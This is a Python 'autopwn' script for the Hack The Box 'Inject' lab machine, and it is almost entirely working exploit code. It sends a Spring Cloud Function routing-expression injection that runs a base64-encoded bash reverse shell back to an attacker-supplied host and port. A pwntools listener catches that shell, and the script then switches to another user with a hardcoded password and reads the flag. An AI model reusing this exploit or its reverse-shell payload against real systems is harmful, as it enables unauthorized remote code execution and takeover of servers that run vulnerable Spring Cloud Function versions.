#!/usr/bin/python3

import random, requests, sys, base64, urllib3
from pwn import *
from threading import Thread

def banner():
    print("""


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡈⢳⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⡈⢷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⠶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣷⠈⢧⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⠀⠹⡄⠀⠀⠀⠀⠀⢀⣠⣤⣾⣿⣿⣿⣧⠘⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠹⣄⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧⠊⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠟⠋⢳⡀⠀⠹⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⠿⠟⢣⠘⣇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣾⡟⠋⠁⠀⠀⠀⠀⢣⡀⠀⠹⣿⣿⣿⣿⣿⣷⠿⠛⠉⠁⠀⠀⠈⢧⠘⣆⠀⠠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡾⢿⠟⢿⣻⡿⠃⠀⠀⣾⡀⠀⠈⢷⠀⠀⢻⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠸⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⣾⡿⣭⣬⣷⠿⠏⠘⣶⡄⠀⠀⡀⠈⣷⡀⠀⠀⢧⡀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠋⠸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠛⠉⠀⠣⢼⠟⢹⡅⠀⠀⠀⠈⢷⡀⠀⣧⡀⠈⣷⡀⣠⣼⢧⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡏⠀⠀⠀⢰⡆⠀⠀⠀⠘⢷⡀⠀⢷⠀⠘⢷⠀⢘⣷⡴⠾⠋⠉⠀⠈⣧⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                            
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣷⡄⠀⠀⠘⢿⡀⠀⢶⡀⠈⣷⡀⠘⣷⣠⡼⠟⠋⠁⠀⠀⠀⠀⠀⠀⠈⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠚⠉⠘⣷⠀⠀⠀⠈⣷⡀⠈⢷⣀⣬⡷⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⣶⠴⠖⠛⣧⡀⠀⠀⣈⣷⠶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣠⠶⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀HTB Inject Autopwn @M4v3r1k⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """)

def send_shell(lhost,lport):
    rev = f'bash -i >&/dev/tcp/{lhost}/{lport} 0>&1'
    rev = rev.encode('utf-8')
    rev = str(base64.b64encode(rev))
    rev = rev.strip('b')
    rev = rev.strip("'")
    rev = 'bash -c {echo,' + rev + '}|{base64,-d}|{bash,-i}'
    

    # Make the reverse shell

    payload = f"T(java.lang.Runtime).getRuntime().exec('{rev}')"

    # def headers and payload

    url = "http://10.10.11.204:8080/functionRouter"
    data = 'Exploited by @m4v3r1k'
    Headers = { 
        'spring.cloud.function.routing-expression' : payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    request = requests.post(url, data=data, headers=Headers)
    log.info('Shell Sended!\n')
    
if __name__ == "__main__":
    banner()
    #variables and check of variables
    
    if len(sys.argv) != 3:
            log.info(f'Use: {sys.argv[0]} <attacker-ip> <attacker-port>')
            log.info(f'Example:\n')
            print(f'\tpython3 {sys.argv[0]} 10.4.37.100 443\n')
            log.info('~ Happy exploitation! @m4v3r1k or @s4ori :D')
            sys.exit(1)

    lip = sys.argv[1] 
    lop = sys.argv[2]
    
            
    try:
        Thread(target=send_shell, args=(lip, lop)).start()
    except:
        log.error("Error in the process, try again!")

    context.log_level='warn'

    shell = listen(lop, timeout=20).wait_for_connection()
    shell.sendline(b'echo -e "Current ~ User: $(whoami)"')
    shell.sendline(b'su phil')
    shell.sendline(b'DocPhillovestoInject123')
    shell.sendline(b'echo -e "\n~ New User: $(whoami)"')
    shell.sendline(b'echo -e "~ Flag: $(cat $HOME/user.txt)"')
    shell.sendline(b'echo -e "~ Enjoy the shell! @m4v3r1k"')
    shell.interactive()


#### thanks to @sha_16 for the lines 70,71,72 >:D
#### Happy hacking
